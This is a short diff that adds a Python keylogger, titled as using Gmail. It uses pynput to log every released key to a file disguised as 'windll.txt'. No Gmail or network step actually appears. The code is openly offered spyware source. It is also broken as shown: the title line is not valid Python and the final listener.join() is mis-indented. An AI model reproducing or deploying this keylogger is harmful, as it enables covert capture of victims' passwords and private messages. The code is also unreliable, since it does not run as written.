@@ -1,0 +1,12 @@
+(keylogger in python and gmail)
+from pynput import keyboard
+
+def on_release(key):
+    try:
+        with open("windll.txt", "a") as f:
+            f.write(f"{key} released\n")
+    except Exception as e:
+        print(f"Error: {e}")
+
+with keyboard.Listener(on_release=on_release) as listener:
+listener.join()
